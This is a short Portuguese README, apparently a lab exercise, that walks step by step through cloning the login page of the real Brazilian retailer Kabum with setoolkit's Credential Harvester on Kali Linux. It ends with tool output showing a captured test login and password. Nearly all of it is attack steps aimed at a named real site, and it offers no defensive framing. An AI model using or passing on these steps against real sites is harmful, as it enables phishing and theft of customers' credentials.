# Phishing para captura de senhas da Kabum

### Ferramentas

- Kali Linux
- setoolkit

### Configurando o Phishing no Kali Linux

- Acesso root: ``` sudo su ```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Site Cloner ```
- Obtendo o endereço da máquina: ``` ifconfig ```
- URL para clone: https://www.kabum.com.br/login?

### Resutados

192.168.0.175 - - [13/Jun/2023 12:51:53] "GET / HTTP/1.1" 200 -
192.168.0.175 - - [13/Jun/2023 12:51:55] "GET /api/account/recaptcha HTTP/1.1" 404 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: {"login":"test@gmail.com.br","password":"Testando@123"}                             
POSSIBLE PASSWORD FIELD FOUND: {"login":"test@gmail.com.br","password":"Testando@123"}                                                                                 
                                                                                              
